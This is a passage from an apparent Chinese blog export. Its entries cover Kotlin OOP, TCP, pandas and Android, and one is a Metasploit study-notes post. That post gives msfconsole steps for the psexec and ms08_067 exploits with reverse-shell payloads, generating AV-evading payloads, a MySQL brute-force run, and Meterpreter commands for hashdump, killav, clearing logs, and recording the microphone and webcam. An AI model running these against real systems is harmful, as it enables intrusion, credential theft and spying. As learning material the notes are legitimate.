class="keyword">fun</span> <span class="title">eat</span><span class="params">()</span></span>&#123;</span><br><span class="line">        println(<span class="string">&quot;大口吃饭&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TaiJian</span>:<span class="type">Human</span></span>()&#123;</span><br><span class="line">    <span class="keyword">override</span> <span class="function"><span class="keyword">fun</span> <span class="title">eat</span><span class="params">()</span></span>&#123;</span><br><span class="line">        println(<span class="string">&quot;吃皇上赏的&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">main</span><span class="params">(args:<span class="type">Array</span>&lt;<span class="type">String</span>&gt;)</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> man1 = Man()</span><br><span class="line">    man1.xiaodidi()</span><br><span class="line">    man1.eat()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">var</span> man2 = TaiJian()</span><br><span class="line">    man2.eat()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">var</span> house = listOf&lt;Human&gt;(man1,man2)</span><br><span class="line">    <span class="keyword">for</span>(person <span class="keyword">in</span> house)&#123;</span><br><span class="line">        <span class="keyword">if</span>(person <span class="keyword">is</span> Man)&#123;   <span class="comment">//判断是否是Man</span></span><br><span class="line">            person.eat()</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h2 id="kotlin面向对象——委托和代理"><a href="#kotlin面向对象——委托和代理" class="headerlink" title="kotlin面向对象——委托和代理"></a>kotlin面向对象——委托和代理</h2><ul>
<li>委托是把事情托付给别人或别的机构办理</li>
<li>代理是指以他人的名义，在授权范围内进行对被代理人直接发生法律效力的法律行为。代理的产生，可以是受他人委托。<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">IWashBow1</span></span>&#123;    <span class="comment">//洗碗的接口</span></span><br><span class="line">    <span class="function"><span class="keyword">fun</span> <span class="title">washing</span><span class="params">()</span></span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BigHeadSon</span>:<span class="type">IWashBowl&#123; //大头儿子</span></span></span><br><span class="line">    <span class="keyword">override</span> <span class="function"><span class="keyword">fun</span> <span class="title">washing</span><span class="params">()</span></span>&#123;</span><br><span class="line">        println(<span class="string">&quot;我是大头儿子，我在洗碗，一次赚1块&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SmallHeadFather</span>:<span class="type">IwashBowl by BigHeadSon</span></span>()&#123;<span class="comment">//小头爸爸,委托给大头儿子去洗碗</span></span><br><span class="line">    <span class="keyword">override</span> <span class="function"><span class="keyword">fun</span> <span class="title">washing</span><span class="params">()</span></span>&#123;</span><br><span class="line">       println(<span class="string">&quot;我是小头爸爸&quot;</span>)</span><br><span class="line">       BigHeadSon().washing()</span><br><span class="line">       println(<span class="string">&quot;我看着儿子把碗洗完了&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">main</span><span class="params">(args:<span class="type">Array</span>&lt;<span class="type">String</span>&gt;)</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> son = BigHeadSon()</span><br><span class="line">    son.washing()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">var</span> father = SmallHeadFather()</span><br><span class="line">    father.washing()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h2 id="kotlin面向对象——单例模式"><a href="#kotlin面向对象——单例模式" class="headerlink" title="kotlin面向对象——单例模式"></a>kotlin面向对象——单例模式</h2><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">object</span> BigHeadSon:IWashBowl&#123;  <span class="comment">//当一个类被定义为object，那么他在内存中就直接被创建，且有且仅有一个</span></span><br><span class="line">    <span class="keyword">override</span> <span class="function"><span class="keyword">fun</span> <span class="title">washing</span><span class="params">()</span></span>&#123;</span><br><span class="line">        println(<span class="string">&quot;我是大头儿子，我在洗碗，一次赚1块&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SmallHeadFather</span>:<span class="type">IwashBowl by BigHeadSon&#123;//再委托的话，需要把括号去掉。</span></span></span><br><span class="line">    <span class="keyword">override</span> <span class="function"><span class="keyword">fun</span> <span class="title">washing</span><span class="params">()</span></span>&#123;</span><br><span class="line">       println(<span class="string">&quot;我是小头爸爸&quot;</span>)</span><br><span class="line">       BigHeadSon.washing()     <span class="comment">//如果带着括号，相当于创建了两个大头儿子</span></span><br><span class="line">       println(<span class="string">&quot;我看着儿子把碗洗完了&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="kotlin面向对象——枚举"><a href="#kotlin面向对象——枚举" class="headerlink" title="kotlin面向对象——枚举"></a>kotlin面向对象——枚举</h2><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">enum</span> <span class="class"><span class="keyword">class</span> <span class="title">Week</span></span>&#123;</span><br><span class="line">    星期一，星期二，星期三，星期四，星期五，星期六，星期日</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">main</span><span class="params">(args:<span class="type">Array</span>&lt;<span class="type">String</span>&gt;)</span></span>&#123;</span><br><span class="line">    println(Week.星期一.ordinal)    <span class="comment">//打印星期一所在位序</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="kotlin面向对象——印章类（Sealed-class）"><a href="#kotlin面向对象——印章类（Sealed-class）" class="headerlink" title="kotlin面向对象——印章类（Sealed class）"></a>kotlin面向对象——印章类（Sealed class）</h2><ul>
<li>子类类型有限的class<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">sealed</span> <span class="class"><span class="keyword">class</span> <span class="title">Son</span></span>&#123;  <span class="comment">//小母驴，小公驴，小公马生下来的儿子</span></span><br><span class="line">    <span class="function"><span class="keyword">fun</span> <span class="title">sayHello</span><span class="params">()</span></span>&#123;</span><br><span class="line">        println(<span class="string">&quot;Hello&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> 小小驴</span>():Son()</span><br><span class="line">    <span class="class"><span class="keyword">class</span> 小骡子</span>():Son()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">main</span><span class="params">(args:<span class="type">array</span>&lt;<span class="type">String</span>&gt;)</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> s1:Son = Son.小骡子()   <span class="comment">//无法直接实例化Son，只能实例化其中的类</span></span><br><span class="line">    <span class="keyword">var</span> s2:Son = Son.小小驴()</span><br><span class="line">    <span class="keyword">var</span> s3:Son = Son.小骡子()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">var</span> list = listOf&lt;Son&gt;(s1,s2,s3)</span><br><span class="line">    <span class="keyword">for</span>(v <span class="keyword">in</span> list)&#123;</span><br><span class="line">        <span class="keyword">if</span>(v <span class="keyword">is</span> Son.小骡子)&#123;</span><br><span class="line">            v.sayHello()</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
        <tag>Kotlin</tag>
      </tags>
  </entry>
  <entry>
    <title>MSF基本命令及实例</title>
    <url>/2020/07/07/MSF%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4%E5%8F%8A%E5%AE%9E%E4%BE%8B/</url>
    <content><![CDATA[<p>@<a href="%E7%9B%AE%E5%BD%95">TOC</a></p>
<h1 id="MSF基本架构"><a href="#MSF基本架构" class="headerlink" title="MSF基本架构"></a>MSF基本架构</h1><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDYvMjkvbUc5MnVLelhOVXNoZDFZLnBuZw?x-oss-process=image/format,png" alt="架构图"></p>
<h2 id="Rex"><a href="#Rex" class="headerlink" title="Rex"></a>Rex</h2><ul>
<li>基本功能库，用于完成日常基本任务，无需人工手动编码实现</li>
<li>处理socker连接访问、协议应答（http/SSL/SMB等）</li>
<li>编码转换（XOR、Base64、Unicode）<h2 id="MSF-Core"><a href="#MSF-Core" class="headerlink" title="MSF::Core"></a>MSF::Core</h2></li>
<li>提供Msf的核心基本API，是框架的核心能力实现库<h2 id="MSF-Base"><a href="#MSF-Base" class="headerlink" title="MSF::Base"></a>MSF::Base</h2></li>
<li>提供友好的API接口，便于模块调用的库<h2 id="Plugin插件"><a href="#Plugin插件" class="headerlink" title="Plugin插件"></a>Plugin插件</h2></li>
<li>连接和调用外部扩展功能和系统</li>
</ul>
<h2 id="MSF数据库"><a href="#MSF数据库" class="headerlink" title="MSF数据库"></a>MSF数据库</h2><h3 id="恢复数据库"><a href="#恢复数据库" class="headerlink" title="恢复数据库"></a>恢复数据库</h3><ul>
<li>msfdb reinit 初始化数据库</li>
</ul>
<h3 id="技术功能模块（不是流程模块）"><a href="#技术功能模块（不是流程模块）" class="headerlink" title="技术功能模块（不是流程模块）"></a>技术功能模块（不是流程模块）</h3><blockquote>
<p>都放置在/usr/share/metasploit-framework/modules/下</p>
</blockquote>
<ul>
<li>Exploits：利用系统漏洞进行攻击的动作，此模块对应每一个具体漏洞的攻击方法（主动、被动）</li>
<li>Payload：成功exploit之后，真正在目标系统执行的代码或指令</li>
</ul>
<ol>
<li>Shellcode或系统命令</li>
<li>三种Payload：/usr/share/metasploit-framework/modules/payloads/<blockquote>
<p>（1）Single：all-in-one，所有内容都在一个payload<br><br>（2）Stager：目标计算机内存有限时，先传输一个较小的payload用于建立连接<br><br>（3）Stages：利用stager建立的连接下载的后续payload<br></p>
</blockquote>
</li>
<li>Stages、Stages都有多种类型，适用于不同场景</li>
<li>Shellcode是payload的一种，由于其建立正向/反向shell而得名</li>
</ol>
<ul>
<li>Auxiliary：执行信息收集、枚举、指纹探测、扫描等功能的辅助模块（没有payload的exploit模块）</li>
<li>Encoders：对payload进行加密，躲避AV检查的模块</li>
<li>Nops：提高payload稳定性及维持大小</li>
</ul>
<h1 id="MSF基本使用和控制台命令-MSFconsole"><a href="#MSF基本使用和控制台命令-MSFconsole" class="headerlink" title="MSF基本使用和控制台命令(MSFconsole)"></a>MSF基本使用和控制台命令(MSFconsole)</h1><h2 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h2><ul>
<li>apt install metasploit-framework</li>
</ul>
<h2 id="地位"><a href="#地位" class="headerlink" title="地位"></a>地位</h2><ul>
<li>最流行的用户接口</li>
<li>几乎可以使用所有MSF功能</li>
<li>控制台命令支持TAP自动补齐</li>
<li>支持外部命令的执行（系统命令等）</li>
<li>启动：msfconsole  / 安静的启动：msfconsole -q</li>
<li>退出：exit</li>
</ul>
<h2 id="帮助命令"><a href="#帮助命令" class="headerlink" title="帮助命令"></a>帮助命令</h2><ul>
<li>help  调出所有命令</li>
<li>help workspace    查看命令详细用法</li>
<li>workspace -h</li>
<li>? workspace</li>
</ul>
<h2 id="MSF控制台基本命令"><a href="#MSF控制台基本命令" class="headerlink" title="MSF控制台基本命令"></a>MSF控制台基本命令</h2><ul>
<li>banner —— 显示banner信息</li>
<li>color —— 启用/禁用颜色提示 —— color true/false</li>
<li>connect —— 连接服务器的指定端口获取工作在端口上工作的服务的banner信息 —— connect 192.168.1.1 80</li>
<li>show —— 展示模块信息 —— show payloads<blockquote>
<p>show options ——显示需要设置的项（进入模块）</p>
</blockquote>
</li>
<li>search —— 搜索模块 —— search ms08-067<blockquote>
<p>search name:mysql cve:2020 platform:linux type:expoit</p>
</blockquote>
</li>
<li>load —— 调用外部插件 —— load nessus</li>
<li>unload —— 删除外部插件 —— unload nessus</li>
<li>loadpath —— 调用指定目录中的其他模块 —— loadpath 路径</li>
<li>route —— 转发一个会话的其他子网的流量 —— route add 子网地址 子网掩码 sessionsID</li>
<li>ird —— 开发环境</li>
<li>resource —— 调用命令资源文件 —— 1.创建.rc文件输入一系列命令，2.msf&gt;下,resource 路径/文件名3.也可以直接msfconsole -r 文件名</li>
</ul>
<h2 id="模块内基本命令"><a href="#模块内基本命令" class="headerlink" title="模块内基本命令"></a>模块内基本命令</h2><ul>
<li>use —— 使用模块 —— use exploit/windows/smb/ms08_067_netapi</li>
<li>info —— 查看当前模块信息 <blockquote>
<ol>
<li>基本信息</li>
<li>provided by：编者</li>
<li>Available targets：使用的系统版本</li>
<li>Basic options：需要设置的项</li>
<li>payload information：payload信息</li>
</ol>
</blockquote>
</li>
<li>show options —— 显示需要设置的项</li>
<li>show target —— 显示适用的系统版本</li>
<li>show payloads —— 显示适用于当前模块的payloads</li>
<li>show advanced —— 显示其他非必须项</li>
<li>show evasion —— 做混淆</li>
<li>show missing —— 显示还未设置的必须参数</li>
<li>set —— 设置参数 —— set RHOST 1.1.1.1</li>
<li>unset —— 取消设置</li>
<li>setg —— 全局设置 —— setg RHOSTS 1.1.1.1</li>
<li>unsetg —— 取消全局设置</li>
<li>save —— 保存配置信息</li>
<li>edit —— 查看或修改当前模块的源代码</li>
<li>check —— 检查目标主机漏洞是否存在（并不是所有的模块都有check命令）</li>
<li>run/exploit —— 运行模块（参数：-j表示后台执行）</li>
<li>sessions —— 如果后台执行，输入这个命令可以查看当前已经建立的会话（参数：-i 2(id)进入会话）</li>
<li>back —— 返回上一级</li>
</ul>
<h2 id="数据库操作"><a href="#数据库操作" class="headerlink" title="数据库操作"></a>数据库操作</h2><ul>
<li>db_rebuild_cache —— 在数据库添加索引，加快搜索速度</li>
<li>db_disconnect —— 断开当前数据库连接</li>
<li>db_connect —— 连接数据库 —— db_connect <a href="user:pass">user:pass</a>@<a href="host:port">host:port</a>/<database>（或者指定配置文件完整路径，/usr/share/metasploit-framework/config/database.yml）</li>
<li>db_nmap —— 集成nmap，扫描结果会保存在数据库中 —— 参数和nmap参数一样 <blockquote>
<ol>
<li>查询数据库主机，hosts 123.57.251.23</li>
<li>搜索, hosts -S linux</li>
<li>端口信息, services -c port(要显示的列) -p 80(要搜索的端口)</li>
</ol>
</blockquote>
</li>
<li>creds —— 查看获取到的登录的账号密码</li>
<li>vulns —— 查看数据库中已查询到的主机漏洞信息</li>
<li>loot —— 查看获取到的哈希值信息</li>
<li>db_export —— 数据库导出 —— db_export -f xml /home/kali/test.xml</li>
<li>db_import —— 数据库导入 —— db_import 文件名</li>
</ul>
<h2 id="Exploit模块"><a href="#Exploit模块" class="headerlink" title="Exploit模块"></a>Exploit模块</h2><h3 id="Active-exploits（主动exploit）"><a href="#Active-exploits（主动exploit）" class="headerlink" title="Active exploits（主动exploit）"></a>Active exploits（主动exploit）</h3><blockquote>
<p>利用服务器开放端口漏洞</p>
</blockquote>
<ul>
<li>实例：利用psexec远程执行漏洞攻击windows<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;smb&#x2F;psexec      &#x2F;&#x2F;使用Active exploit模块</span><br><span class="line">set RHOST 192.168.126.129       &#x2F;&#x2F;配置被攻击者Ip地址</span><br><span class="line">set PAYLOAD windows&#x2F;shell&#x2F;reverse_tcp   &#x2F;&#x2F;配置payload</span><br><span class="line">set LHOST 192.168.1.1       &#x2F;&#x2F;配置接收反弹shell的主机地址（本机地址）</span><br><span class="line">set LPORT 4444      &#x2F;&#x2F;配置接收反弹shell的主机端口</span><br><span class="line">set SMBUSER user1   &#x2F;&#x2F;配置被攻击者的管理员账号</span><br><span class="line">set SMBPASS pass1   &#x2F;&#x2F;配置被攻击者的管理员密码</span><br><span class="line">exploit     &#x2F;&#x2F;执行</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h3 id="Passive-exploits（被动exploit）"><a href="#Passive-exploits（被动exploit）" class="headerlink" title="Passive exploits（被动exploit）"></a>Passive exploits（被动exploit）</h3><blockquote>
<p>利用客户端程序漏洞</p>
</blockquote>
<ul>
<li>实例：利用ani_loadimage_chunksize模块攻击windows<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;browser&#x2F;ani_loadimage_chunksize</span><br><span class="line">set SRVHOST 192.168.126.131   &#x2F;&#x2F;设置网站地址</span><br><span class="line">set URIPATH &#x2F;       &#x2F;&#x2F;设置网站路径</span><br><span class="line">set PAYLOAD windows&#x2F;shell&#x2F;reverse_tcp   &#x2F;&#x2F;设置payload</span><br><span class="line">set LHOST 192.168.1.1       &#x2F;&#x2F;设置监听地址</span><br><span class="line">set LPORT 4444              &#x2F;&#x2F;设置监听端口</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h3 id="生成payload"><a href="#生成payload" class="headerlink" title="生成payload"></a>生成payload</h3><ul>
<li>search shell_bind_tcp       //搜索payload</li>
<li>use 40      //选择要使用的payload</li>
<li>show options    //查看需要设置的参数，注意：在payload中，LPORT表示本地（被攻击者）要开放的端口，RHOST表示允许获取shell的远程主机IP</li>
<li>generate    //生成16进制payload <blockquote>
<ol>
<li>generate -b ‘\x00\xff’可以过滤掉坏字符）</li>
<li>generate -e x86/nonalpha  —— 手动指定encoder</li>
<li>generate -b ‘\x00’ -t exe -e x86/shikata_ga_nai -i 5 -k -x /usr/share/windows-binaries/radmin.exe -f /root/1.exe</li>
<li>-b 排除坏字符，-t 输出什么格式，-e 指定encoder，-i 编码几轮，-k 不产生新的进程，-x 可以把payload绑定到的模板，-f /root/1.exe。</li>
</ol>
</blockquote>
</li>
<li>nc 192.168.1.114 4444 —— 被攻击者点击文件后，开放4444端口，直接连接即可</li>
<li>NOP(no-operation/Next Operation（无任何操作）)<blockquote>
<ol>
<li>EIP返回到存储NOP sled的任意地址时将递增，最终导致shellcode执行</li>
<li>generate -s 14（给payload加上14字节的nop前缀）</li>
</ol>
</blockquote>
</li>
</ul>
<h3 id="Meterpreter"><a href="#Meterpreter" class="headerlink" title="Meterpreter"></a>Meterpreter</h3><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><ul>
<li>高级、动态、可扩展的Payload<blockquote>
<ol>
<li>基于meterpreter上下文利用更多漏洞发起攻击</li>
<li>后渗透测试阶段一站式操作界面</li>
</ol>
</blockquote>
</li>
<li>完全基于内存的DLL注入式payload（不写硬盘）<blockquote>
<ol>
<li>注入合法系统进程并建立stager</li>
<li>基于Stager上传和预加载DLL进行扩展模块的注入（客户端API）</li>
<li>基于Stager建立的socket连接建立加密的TLS/1.0通信隧道</li>
<li>利用TLS隧道进一步加载后续扩展模块（避免网络取证）</li>
</ol>
</blockquote>
</li>
<li>服务端用C语言编写</li>
<li>客户端提供基于ruby的全特性API（支持任何语言）</li>
</ul>
<h4 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h4><ul>
<li>set payload windows/metepreter/reverse_tcp  —— 配置payload的时候配置shell为meterpreter</li>
<li>windows和linux命令大部否都支持（ls,dir,cd,cat,mkdir,rmdir.mv,rm,edit(编辑类似vi)）</li>
<li>help  —— 帮助</li>
<li>pwd —— 查看当前空座目录</li>
<li>lpwd —— kali上当前工作目录</li>
<li>lcd —— 在kali上切换目录</li>
<li>run —— 运行脚本</li>
<li>bgrun —— 后台运行脚本 —— bgrun vnc(打开桌面监控)/sound_recorder(打开麦克风)/webcam(打开摄像头)/killav(杀死杀毒软件)/winbf(用肉机暴力破解)/</li>
<li>clearev —— 清除日志</li>
<li>download —— 下载目标系统上的文件</li>
<li>upload —— 上传文件</li>
<li>execute —— 执行文件 —— execute -f cmd.exe -i -H （-f 执行什么程序，-i 交互，-H 隐藏）</li>
<li>gituid —— 查看当前账户</li>
<li>getsystem —— 提权到system</li>
<li>getprivs —— 查看当前权限</li>
<li>getproxy —— 获取代理</li>
<li>ps —— 查看当前工作着的进程</li>
<li>getpid —— 查看自己注入的进程pid</li>
<li>migrate —— 迁移注入的进程 —— migrate 652</li>
<li>hashdump —— 获取系统账号密码hash值</li>
<li>sysinfo —— 查看系统信息</li>
<li>kill —— 杀死进程 —— kill 1052</li>
<li>reboot —— 重启</li>
<li>shutdown —— 关机</li>
<li>shell —— 获取操作系统shell</li>
<li>show_mount —— 查看硬盘使用情况</li>
<li>search —— 搜索文件 —— search -f data.ini</li>
<li>arp —— 查看arp缓存</li>
<li>netstat —— 查看端口开放情况</li>
<li>ipconfig/ifconfig —— 查看ip地址</li>
<li>idletime —— 查看操作系统空闲时间</li>
<li>resource —— 调度外部资源文件（类似msf的resource）</li>
<li>record_mic —— 记录麦克风出现的声音</li>
<li>webcam_list —— 列出靶机上连接的所有摄像头</li>
<li>webcam_snap -i -v false —— 每隔1秒拍个照</li>
</ul>
<h4 id="Meterpreter-python扩展"><a href="#Meterpreter-python扩展" class="headerlink" title="Meterpreter python扩展"></a>Meterpreter python扩展</h4><ul>
<li>2015年11月份，来自社区的贡献</li>
<li>无需运行环境，在客户端运行原生python代码</li>
<li>load python （加载插件。meterpreter&gt;环境下）</li>
<li>Help</li>
<li>python_execute “print(“Hello world!”)”</li>
<li>python_execute “import os;cd = os.getcwd()” -r cd （-r 表示返回出来的变量）</li>
<li>python_import -f find.py</li>
</ul>
<h1 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h1><h3 id="暴力破解mysql数据库密码"><a href="#暴力破解mysql数据库密码" class="headerlink" title="暴力破解mysql数据库密码"></a>暴力破解mysql数据库密码</h3><ul>
<li>找到并使用mysql_login模块<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">search mysql_login</span><br><span class="line">use mysql_login</span><br></pre></td></tr></table></figure></li>
<li>查看需要设置的项<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">show options</span><br></pre></td></tr></table></figure></li>
<li>设置主机，用户名，和密码字典<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set RHOSTS 127.0.0.1</span><br><span class="line">set USERNAME lrf</span><br><span class="line">set BLANK_PASSWORDS true   &#x2F;&#x2F;检测空密码</span><br><span class="line">set PASS_FILE &#x2F;home&#x2F;kali&#x2F;ruo.txt</span><br></pre></td></tr></table></figure></li>
<li>执行<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">run&#x2F;expoit    &#x2F;&#x2F;出现绿色加号证明成功</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h3 id="ms08-o67经典漏洞利用（xp）"><a href="#ms08-o67经典漏洞利用（xp）" class="headerlink" title="ms08-o67经典漏洞利用（xp）"></a>ms08-o67经典漏洞利用（xp）</h3><ul>
<li>找到并使用ms08-067<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">search ms08_067</span><br><span class="line">use ms08_067_netapi</span><br></pre></td></tr></table></figure></li>
<li>查看需要设置的项并挨个设置<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">show options</span><br><span class="line">set RHOST 192.168.1.1</span><br></pre></td></tr></table></figure></li>
<li>查看并设置主机系统版本<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">show targets</span><br><span class="line">set target 34</span><br></pre></td></tr></table></figure></li>
<li>查看并设置payloads<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">show payloads</span><br><span class="line">set payload windows&#x2F;shell&#x2F;reverse_tcp</span><br><span class="line">set lhost 192.168.1.1</span><br></pre></td></tr></table></figure></li>
<li>执行<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">exploit</span><br></pre></td></tr></table></figure>


</li>
</ul>
]]></content>
      <categories>
        <category>MSF</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
        <tag>MSF</tag>
      </tags>
  </entry>
  <entry>
    <title>全球都在下GTA5，我却从中参透了TCP协议</title>
    <url>/2020/05/15/%E5%85%A8%E7%90%83%E9%83%BD%E5%9C%A8%E4%B8%8BGTA5%EF%BC%8C%E6%88%91%E5%8D%B4%E4%BB%8E%E4%B8%AD%E5%8F%82%E9%80%8F%E4%BA%86TCP%E5%8D%8F%E8%AE%AE/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><ul>
<li>首先，不得不说，EPIC是真的大方，直接将GTAV免费送，没有领取的小伙伴先<a href="https://www.epicgames.com/store/zh-CN/">点这里</a>白嫖一下，然后开始我们今天的正事。</li>
<li>可能博主也是等这94个G等迷糊了，想起了TCP的传输过程，文章不长，也是突然间想到记下来，大家看个乐呵就行，如果理解有误，请大佬指正。<h1 id="开始分析"><a href="#开始分析" class="headerlink" title="开始分析"></a>开始分析</h1><h2 id="首先附上下载过程图片"><a href="#首先附上下载过程图片" class="headerlink" title="首先附上下载过程图片"></a>首先附上下载过程图片</h2><img src="https://img-blog.csdnimg.cn/2020051514332860.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3MTg0Mg==,size_16,color_FFFFFF,t_70" alt="GTA5下载"></li>
</ul>
<h2 id="TCP可靠传输的实现"><a href="#TCP可靠传输的实现" class="headerlink" title="TCP可靠传输的实现"></a>TCP可靠传输的实现</h2><ul>
<li>EPIC客户端下载类似Steam，有5个进度条，我也不多废话，直接看最后一个和倒数第二个进度条。</li>
<li>首先看一个动态图<a href="http://www.exa.unicen.edu.ar/catedras/comdat1/material/Filminas3_Practico3.swf">点击跳转</a></li>
<li>看过之后你会发现，最后一个进度条和TCP的传输很像，怎么像呢，下面我来解释下。</li>
</ul>
<ol>
<li>以“字节”为单位：可以把最后一个进度条的一个小方格看成一个字节（虽然肯定比字节大很多），你会发现，他们都是一个一个或一组一组往后传输的。</li>
<li>检测丢失并重传：深蓝色的是没有传输的，浅蓝色的是丢失的（或错误的），粉色的是传输完成的，绿色的是传输完成并确认（写入）的。偶尔会出现丢失（出现一个浅蓝方格），那么写入就会停止，等待重传后再继续写入。</li>
<li>有接收缓存：缓存的存在是协调高速设备和低速设备，最后一个进度条就类似缓冲区，写入的速度非常快（达到400M每秒），而下载的速度相较就非常慢，缓冲区的存在协调了这种差距，偶尔写入停止，等待没有错误再继续写入。</li>
</ol>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><ul>
<li>文章仅代表个人拙见，可能人家设计的进度条根本不是这个意思，但是将其作为TCP传输模型也未尝不可。</li>
<li>心（xian）血（de）来（dan）潮（teng）记录一下个人发现，如有错误地方，请大佬指正。</li>
</ul>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title>一次Pandas踩坑记录（为什么Dataframe创建时指定的列名和列不对应）</title>
    <url>/2020/07/24/%E4%B8%80%E6%AC%A1Pandas%E8%B8%A9%E5%9D%91%E8%AE%B0%E5%BD%95%EF%BC%88%E4%B8%BA%E4%BB%80%E4%B9%88Dataframe%E5%88%9B%E5%BB%BA%E6%97%B6%E6%8C%87%E5%AE%9A%E7%9A%84%E5%88%97%E5%90%8D%E5%92%8C%E5%88%97%E4%B8%8D%E5%AF%B9%E5%BA%94%EF%BC%89/</url>
    <content><![CDATA[<ul>
<li>最近做课设的时候遇到一个特别头疼的问题，在将ndarray转换为dataframe时，指定的列名就是对应不起来（如下图），四处询问，查看pandas源码均无果。<br><img src="https://img-blog.csdnimg.cn/20200724163815215.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3MTg0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li>
<li>解决方法：一次偶然的尝试我发现错误原因，Dataframe创建时指定列名columns应该是数组形式而不是字典形式，也就是说应该用“[]”而不是“{}”。</li>
<li>因为一个小马虎耽误了这么长时间(\捂脸)。发此文记录下自己的马虎经历，也给读者们作反面教材。</li>
</ul>
]]></content>
      <categories>
        <category>随手记</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>记一次用Android studio开发一个小型对话机器人app</title>
    <url>/2020/04/09/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%94%A8Android%20studio%E5%BC%80%E5%8F%91%E4%B8%80%E4%B8%AA%E5%B0%8F%E5%9E%8B%E5%AF%B9%E8%AF%9D%E6%9C%BA%E5%99%A8%E4%BA%BAapp/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><ul>
